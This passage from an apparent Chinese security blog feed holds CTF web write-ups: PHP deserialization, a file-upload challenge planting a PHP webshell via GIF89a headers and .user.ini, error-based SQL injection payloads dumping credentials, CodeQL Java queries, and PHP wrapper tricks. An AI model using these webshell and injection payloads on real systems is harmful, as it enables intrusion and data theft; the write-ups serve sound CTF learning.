function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br> <br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>很明显的反序列化，但是这里会对序列化的字符进行过滤，即每个字母的ASCII值在32到125之间，由于类中使用的是<code>protected</code>，序列化之后会出现<code>%00</code>字符，不符合要求。</p><p>绕过方法是在php7.1以上的版本，对属性类型不敏感，所以使用<code>public</code>也可以的。</p><p>另一个是在<code>__destruct()</code>中<code>$this-&gt;op===&quot;2&quot;</code>的条件，而在<code>process()</code>中<code>$this-&gt;op==&quot;2&quot;</code>，要绕过可以使用数字<code>2</code>，在<code>__destruct()</code>中的强比较返回false，在<code>process()</code>的弱比较返回true。</p><p>在本地进行测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>使用这个得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] SUCTF2019-CheckIn</title>
    <link href="/2022/12/07/%5Bctf-web%5D%20BUCTF2019-ChickIn/"/>
    <url>/2022/12/07/%5Bctf-web%5D%20BUCTF2019-ChickIn/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>是一道文件上传的题目。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png" alt="image-20221207223543971"></p><p>尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为<code>jpg</code>，提示不能包含<code>&lt;?</code>；修改一句话木马为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>提示<code>exif_imagetype:not image!</code>；添加<code>GIF89a</code>文件头，上传成功。</p><p>到这里考虑如何能够执行木马，首先想到的是<code>.htaccess</code>，然后使用：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89a</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;three.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span> <br></code></pre></td></tr></table></figure><p>但是这个好像没有成功，没有能够正确解析<code>three.jpg</code>，可能是因为文件头的原因。</p><p>然后就发现了<code>.user.ini</code>文件，内容为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=three.jpg<br></code></pre></td></tr></table></figure><p>这段代码表示让所有php文件自动包含某个文件，由于该目录下还有<code>index.php</code>文件，所以就可以通过这个文件来触发木马。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=var_dump(scandir(%<span class="hljs-number">22</span>/%<span class="hljs-number">22</span>));<br><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=system(%<span class="hljs-number">27</span>cat%<span class="hljs-number">20</span>/flag%<span class="hljs-number">27</span>);<br></code></pre></td></tr></table></figure><p><strong>记得加分号</strong></p><blockquote><p>同类型：</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2></blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马_Tr0e的博客-CSDN博客_一句话木马</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过_Tr0e的博客-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 极客大挑战2019-HardSQL</title>
    <link href="/2022/12/05/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/"/>
    <url>/2022/12/05/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>进入是登录界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205203424098.png" alt="image-20221205203424098"></p><p>根据之前的经验，使用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">123</span><br></code></pre></td></tr></table></figure><p>出错，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205203546111.png" alt="image-20221205203546111"></p><p>使用</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">admin&#x27;<span class="hljs-comment">#</span><br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>没有出错，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205203620106.png" alt="image-20221205203620106"></p><p>使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br><span class="hljs-attribute">123</span><br></code></pre></td></tr></table></figure><p>应该是被拦截了，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205203703670.png" alt="image-20221205203703670"></p><p>尝试</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#</span><br>admin&#x27; <span class="hljs-keyword">or</span><span class="hljs-comment">#</span><br>admin&#x27; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>都被拦截，所以应该是过滤了空格，使用</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">admin&#x27;<span class="hljs-comment">/**/</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>还是被过滤了，然后网上查找，找到了用<code>()</code>绕过空格的方法，使用</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>登录成功</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205133708.png" alt="image-20221205205133708"></p><p>尝试用报错注入，</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205259177.png" alt="image-20221205205259177"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">table_name</span>)from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(&#x27;geek&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205326840.png" alt="image-20221205205326840"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205352085.png" alt="image-20221205205352085"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;~&#x27;,username,&#x27;~&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205428506.png" alt="image-20221205205428506"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">25</span>))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221205205511969.png" alt="image-20221205205511969"></p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql-java</title>
    <link href="/2022/12/01/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql-java/"/>
    <url>/2022/12/01/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql-java/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql-java"><a href="#codeql-java" class="headerlink" title="codeql-java"></a>codeql-java</h1><p>codeql学习</p><h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><p>查询所有方法：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">method</span><br></code></pre></td></tr></table></figure><p>查询以<code>get</code>开头的方法：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;get%&quot;)</span><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">method</span><br></code></pre></td></tr></table></figure><p>查询名为<code>getStudent</code>的方法：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;getStudent&quot;)</span><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">method</span> <br></code></pre></td></tr></table></figure><p>查询在<code>IndexDb</code>类中的<code>getStudent</code>方法：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;getStudent&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">exists</span><span class="hljs-params">(RefType c | c.hasName(&quot;IndexDb&quot;)</span> <span class="hljs-title function_">and</span> <span class="hljs-title function_">c</span>.<span class="hljs-title function_">getAMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span>)<br><span class="hljs-title function_">select</span> <span class="hljs-title function_">method</span> <br></code></pre></td></tr></table></figure><p>查询<code>getStudent</code>方法被调用：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">MethodAccess</span> <span class="hljs-title function_">ma</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;getStudent&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">ma</span><br></code></pre></td></tr></table></figure><p>查询<code>IndexDb</code>类中的<code>getStudent</code>方法被调用：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">MethodAccess</span> <span class="hljs-title function_">ma</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;getStudent&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">exists</span><span class="hljs-params">(RefType c | c.hasName(&quot;IndexDb&quot;)</span> <span class="hljs-title function_">and</span> <span class="hljs-title function_">c</span>.<span class="hljs-title function_">getAMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span> )<br><span class="hljs-title function_">select</span> <span class="hljs-title function_">ma</span><br></code></pre></td></tr></table></figure><p>或者这样：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">MethodAccess</span> <span class="hljs-title function_">ma</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;getStudent&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getDeclaringType</span><span class="hljs-params">()</span>.<span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(&quot;com.l4yn3.microserviceseclab.db&quot;, &quot;IndexDb&quot;)</span><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">ma</span><br></code></pre></td></tr></table></figure><p>查询<code>org.springframework.jdbc.core</code>包中<code>JdbcTemplate</code>中方法<code>query</code>第一个参数名是<code>sql</code>：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">MethodAccess</span> <span class="hljs-title function_">ma</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;query&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getDeclaringType</span><span class="hljs-params">()</span>.<span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(&quot;org.springframework.jdbc.core&quot;, &quot;JdbcTemplate&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getArgument</span><span class="hljs-params">(0)</span>.<span class="hljs-title function_">toString</span><span class="hljs-params">()</span> = &quot;<span class="hljs-title function_">sql</span>&quot;<br><br><span class="hljs-title function_">select</span> <span class="hljs-title function_">ma</span><br></code></pre></td></tr></table></figure><p>查询<code>org.springframework.jdbc.core</code>包中<code>JdbcTemplate</code>中方法<code>query</code>第一个参数类型是<code>String</code>：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">from</span> <span class="hljs-keyword">Method</span> <span class="hljs-title function_">method</span>, <span class="hljs-title function_">MethodAccess</span> <span class="hljs-title function_">ma</span>, <span class="hljs-title function_">Parameter</span> <span class="hljs-title function_">p</span><br><span class="hljs-title function_">where</span> <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getName</span><span class="hljs-params">()</span>.<span class="hljs-title function_">matches</span><span class="hljs-params">(&quot;query&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> = <span class="hljs-title function_">method</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">method</span>.<span class="hljs-title function_">getDeclaringType</span><span class="hljs-params">()</span>.<span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(&quot;org.springframework.jdbc.core&quot;, &quot;JdbcTemplate&quot;)</span> <span class="hljs-title function_">and</span> <br>      <span class="hljs-title function_">ma</span>.<span class="hljs-title function_">getArgument</span><span class="hljs-params">(0)</span>.<span class="hljs-title function_">getType</span><span class="hljs-params">()</span>.<span class="hljs-title function_">toString</span><span class="hljs-params">()</span> = &quot;<span class="hljs-title function_">String</span>&quot;<br><span class="hljs-title function_">select</span> <span class="hljs-title function_">ma</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
      <tag>codeql-java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] ZJCTF2019-NiZhuanSiWei</title>
    <link href="/2022/12/01/%5Bctf-web%5D%20ZJCTF2019-NiZhuanSiWei/"/>
    <url>/2022/12/01/%5Bctf-web%5D%20ZJCTF2019-NiZhuanSiWei/</url>
    
    <content type="html"><![CDATA[<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>进入页面就是代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有三个参数，首先是<code>text</code>，需要通过<code>file_get_contents</code>读<code>text</code>的内容，且内容为<code>welcome to the zjctf</code>，这就需要用到PHP伪协议了，</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">?<span class="hljs-keyword">text</span>=<span class="hljs-keyword">data</span>:<span class="hljs-comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></code></pre></td></tr></table></figure><p>成功绕过；然后是<code>file</code>参数，不能包括<code>flag</code>，但是提示有<code>useless.php</code>文件，那么就通过PHP伪协议来读取其内容，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure><p>读到了内容，解码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 